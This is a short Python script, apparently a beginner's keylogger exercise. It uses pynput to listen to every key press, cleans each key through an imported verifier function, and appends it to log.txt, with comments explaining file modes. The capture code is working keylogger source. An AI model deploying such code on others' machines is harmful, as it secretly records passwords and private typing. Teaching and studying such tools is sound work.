from pynput.keyboard import Listener
from verifier import verifier

# it has to stores the keystrokes in a text file
# file handling - read, write and append

# r - reading
# w - writing
# a - appending to a file

# Listeners - Listen to keystrokes

if __name__ == '__main__':
    def write_to_file(key):
        letter = str(key)
        letter = letter.replace("'", "")

        letter = verifier(letter)

        # Closes the file automatically - Release memory
        with open("log.txt", "a") as f:
            
            f.write(f"Typed Key -> {letter}\n")
            
    with Listener(on_press=write_to_file) as listener:
        listener.join()